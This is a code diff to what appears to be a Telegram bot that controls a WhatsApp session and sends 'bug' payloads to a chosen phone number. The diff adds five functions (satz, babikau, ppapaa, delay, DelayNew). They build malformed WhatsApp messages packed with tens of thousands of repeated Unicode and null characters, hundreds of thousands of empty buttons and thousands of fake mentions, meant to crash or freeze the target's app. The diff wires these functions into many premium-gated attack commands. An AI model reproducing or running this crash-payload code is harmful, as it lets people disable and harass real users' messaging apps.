@@ -4665,6 +4665,12 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
     await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -4773,6 +4779,12 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
     await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -4866,6 +4878,12 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await delaycombo(sock, target);
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
+    await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
     await sleep(5000);
   }
 
@@ -4974,6 +4992,12 @@ if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
     await delaycombo(sock, target);
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
+    await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
     await sleep(5000);
   }
 
@@ -5084,6 +5108,12 @@ bot.command("combox", checkWhatsAppConnection, checkCooldown, async (ctx) => {
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
     await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5148,6 +5178,12 @@ bot.command("/specterdelay", checkWhatsAppConnection, checkPremium, checkCooldow
     await delaycombo(sock, target);
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
+    await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
     await sleep(5000);
     }
 
@@ -5254,6 +5290,12 @@ bot.command("drainkouta", checkWhatsAppConnection, checkPremium, checkCooldown, 
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
     await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5319,6 +5361,12 @@ bot.command("StupidLow", checkWhatsAppConnection, checkPremium, checkCooldown, a
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
     await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5383,6 +5431,12 @@ bot.command("flowrdelay", checkWhatsAppConnection, checkPremium, checkCooldown, 
     await delaycombo(sock, target);
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
+    await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
     await sleep(5000);
     }
 
@@ -5490,6 +5544,12 @@ bot.command("KillerBlnk", checkWhatsAppConnection, checkPremium, checkCooldown, 
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
     await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
+    await sleep(5000);
     }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5593,6 +5653,12 @@ bot.command("VisiSat", checkWhatsAppConnection, checkPremium, checkCooldown, asy
     await delaycombo(sock, target);
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
+    await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
     await sleep(5000);
   }
 
@@ -5698,6 +5764,12 @@ bot.command("FlowSat", checkWhatsAppConnection, checkPremium, checkCooldown, asy
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
     await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
+    await sleep(5000);
   }
 
   await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
@@ -5761,6 +5833,12 @@ bot.command("SatHard", checkWhatsAppConnection, checkPremium, checkCooldown, asy
     await delaycombo(sock, target);
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
+    await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
     await sleep(5000);
   }
 
@@ -5885,6 +5963,12 @@ bot.command("MediumLay", checkWhatsAppConnection, checkPremium, checkCooldown, a
     await delaycombo(sock, target);
     await DelayXCrash(sock, target);
     await FcOneMsg(sock, target);
+    await sleep(5000);
+    await DelayNew(target);
+    await delay(sock, target);
+    await ppapaa(target);
+    await babikau(sock, target);
+    await satz(sock, target);
     await sleep(5000);
   }
 
@@ -6861,7 +6945,247 @@ bot.on("text", async (ctx) => {
 bot.catch((err) => {
   console.error('Bot error:', err);
 });
+    
 // FUNCTION BUG
+async function satz(sock, target) {
+
+  const message = {
+    interactiveMessage: {
+header: {
+title: "ြ".repeat(25000),
+subtitle: "ြ".repeat(25000),
+},
+      body: {
+        text: "\0".repeat(1000)
+      },
+contextInfo: {
+quotedMessage: {
+conversation: null
+},
+     "externalAdReply": {
+          "title": "\0".repeat(15000),
+          "body": "Satz",
+          "mediaType": "IMAGE",
+          "thumbnailUrl": "https://i.imgur.com/xxx.jpg",
+          "sourceUrl": "https://AlzSync-í.devLevi4thanCrasher",
+          "renderLargerThumbnail": true
+        },
+        "forwardedNewsletterMessageInfo": {
+          "newsletterJid": "120363426179267743@newsletter",
+          "serverMessageId": 143,
+          "newsletterName": "⭑‌⟅ ༑ ▾⿻ Levi4than ⿻ ▾ ༑‌⟆ ⭑"
+        },
+mentionedJid: Array.from({ length: 1999 }, () => 
+                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
+                        ),
+isForwarded: true,
+        statusAttributionType: 4,
+        statusAttributions: Array.from({ length: 5000 }, () => ({
+          type: 1
+          }))
+},
+      nativeFlowMessage: { buttons: Array.from({ length: 300000 }, () => ({})) }
+    }
+  }
+
+const msg = {
+interactiveMessage: {
+header: {
+title: "ြ".repeat(15000),
+subtitle: "ြ".repeat(15000),
+   "hasMediaAttachment": true,
+        "locationMessage": {
+          "degreesLatitude": -6.2,
+          "degreesLongitude": 106.816666,
+          "name": "⭑‌⟅ ༑ ▾⿻ Satz ⿻ ▾ ༑‌⟆ ⭑",
+          "address": "Satz",
+          "jpegThumbnail": null,
+        }
+},
+body: { text: "Satz" },
+contextInfo: {
+quotedMessage: {
+interactiveMessage: {
+body: {},
+nativeFlowMessage: { buttons: Array.from({ length: 30000 }, () => ({})) }
+}
+},
+     "externalAdReply": {
+          "title": "\u0000".repeat(10000),
+          "body": "Satz",
+          "mediaType": "IMAGE",
+          "thumbnailUrl": "https://i.imgur.com/xxx.jpg",
+          "sourceUrl": "https://AlzSync-í.devLevi4thanCrasher",
+          "renderLargerThumbnail": true
+        },
+        "forwardedNewsletterMessageInfo": {
+          "newsletterJid": "120363426179267743@newsletter",
+          "serverMessageId": 143,
+          "newsletterName": "⭑‌⟅ ༑ ▾⿻ Levi4than ⿻ ▾ ༑‌⟆ ⭑"
+        },
+mentionedJid: Array.from({ length: 1999 }, () => 
+                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
+                        ),
+isForwarded: true,
+        statusAttributionType: 4,
+        statusAttributions: Array.from({ length: 5000 }, () => ({
+          type: 1
+          }))
+},
+nativeFlowMessage: {
+buttons: [
+{
+                                    name: "booking_status",
+                                    buttonParamsJson: JSON.stringify({
+                    display_text: "ꦽꦾ".repeat(20000),
+                    phone_number: "00000000000000"
+                  })
+                                }
+]
+}
+}
+}
+
+await sock.relayMessage(target,msg,{})
+  await sock.relayMessage(
+    target,
+    message,
+    {}
+  )
+}
+async function babikau(sock, target) {
+    try {
+        const mentionedPlerSange = [
+            "13135550002@s.whatsapp.net",
+            ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
+        ];
+
+        await sock.relayMessage(
+            "status@broadcast",
+            {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: { text: " ✘ - @MirulZtyzz ", format: 1 },
+                            nativeFlowResponseMessage: {
+                                name: "call_permission_request",
+                                paramsJson: JSON.stringify({
+                                    status: "ok",
+                                    title: "𑇂𑆵𑆴𑆿".repeat(60000),
+                                    groupStatusMessageV2: {
+                                        message: {
+                                            interactiveResponseMessage: {
+                                                body: { text: "\u0000".repeat(250000), format: 0 },
+                                                nativeResponseMessage: {
+                                                    buttons: [
+                                                        {
+                                                            name: "flow_cta",
+                                                            buttonParamsJson: JSON.stringify({
+                                                                paramsJson: `{"flow_cta":"${"\u0000".repeat(90000)}"}`,
+                                                                entryPointConversionSource: "call_permission_request",
+                                                                version: 3
+                                                            })
+                                                        }
+                                                    ]
+                                                }
+                                            }
+                                        }
+                                    },
+                                    contextInfo: { mentionedJid: mentionedPlerSange }
+                                })
+                            }
+                        }
+                    }
+                }
+            },
+            { statusJidList: [target] }
+        );
+    } catch (e) {
+        console.error("Error Saat Menggunakan Function:", e);
+    }
+}
+
+async function ppapaa(target) {
+    const message = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "✘ - @MirulZtyzz",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "address_message",
+                        paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"INCEPTION","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
+                        version: 3
+                    },
+                    contextInfo: {
+                        quotedMessage: {
+                            paymentInviteMessage: {
+                                serviceType: 2,
+                                expiryTimestamp: Math.floor(Date.now() / 1000) + 8640000
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    };
+
+    await sock.relayMessage(target, message, {});
+}
+
+async function delay(sock, target) {
+const msg = {
+interactiveMessage: {
+body: { text: "XvR — @XakaJir" },
+nativeFlowMessage: {
+buttons: [
+{
+name: "quick_reply",
+buttonParamsJson: JSON.stringify({
+display_text: "\u800b",
+id: "\u300b".repeat(10000)
+})
+}
+],
+version: 1
+}
+}
+}
+await sock.relayMessage(target, msg, {});
+console.log("success send");
+}
+
+async function DelayNew(target) {
+  try {
+    const msg = {
+      viewOnceMessage: {
+        message: {
+          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
+          interactiveMessage: {
+            body: { 
+              text: " - nanz - ", 
+              format: "DEFAULT" 
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: "\u0000".repeat(20000), 
+              version: 3
+            },
+            contextInfo: {
+              entryPointConversionSource: "call_permission_request"
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(target, msg, {});
+  } catch (err) {
+  }
+}
+
 async function FcOneMsg(sock, target) {
   let msg = {
     requestPaymentMessage: {
